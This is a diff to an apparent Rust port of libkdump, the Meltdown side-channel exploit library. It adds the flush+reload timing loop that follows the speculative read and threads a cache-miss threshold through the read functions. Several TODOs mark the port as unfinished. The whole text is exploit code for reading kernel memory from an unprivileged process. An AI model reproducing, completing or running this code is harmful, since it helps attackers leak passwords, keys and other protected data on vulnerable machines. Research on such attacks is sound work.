@@ -60,7 +60,7 @@ pub fn flush(pointer: *const MemoryPage) {
     }
 }
 
-pub fn flush_reload(pointer: *const MemoryPage, cache_miss_threshold: u64) -> bool {
+pub fn flush_reload(cache_miss_threshold: u64, pointer: *const MemoryPage) -> bool {
     let start_time: u64;
     let end_time: u64;
     
@@ -73,22 +73,34 @@ pub fn flush_reload(pointer: *const MemoryPage, cache_miss_threshold: u64) -> bo
     end_time - start_time < cache_miss_threshold
 }
 
-pub fn libkdump_read_signal_handler(retries: u32, mem: &[MemoryPage], pointer: *const u128) -> usize {
+pub fn libkdump_read_signal_handler(retries: u32, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u128) -> usize {
 	for _ in 0..retries {
 		// TODO: Set segmentation fault callback position
 		meltdown_fast(mem, pointer);
+			
+		for i in 0..mem.len() {
+			if flush_reload(cache_miss_threshold, &mem[i] as *const MemoryPage) {
+				if i >= 1 { // TODO why ignore first entry?
+					return i;
+				}
+			}
+			// TODO: original has sched_yield(); here
+		}
+		// TODO: original has sched_yield(); here
 	}
 	
 	return 0;
 }
 
-pub fn libkdump_read(measurements: u32, retries: u32, mem: &[MemoryPage], accept_after: u32, pointer: *const u128) -> u32 {
+pub fn libkdump_read(measurements: u32, retries: u32, cache_miss_threshold: u64, mem: &[MemoryPage], accept_after: u32, pointer: *const u128) -> u32 {
 	const ARRAY_SIZE: usize = 256;
 	let mut res_stat: [u32; ARRAY_SIZE] = [0; ARRAY_SIZE];
 	
+	// TODO: original has sched_yield(); here
+	
 	for _ in 0..measurements {
 		// TODO: Add implementation using TSX?
-		let r = libkdump_read_signal_handler(retries, mem, pointer);
+		let r = libkdump_read_signal_handler(retries, cache_miss_threshold, mem, pointer);
 		res_stat[r] += 1;
 	}
 	
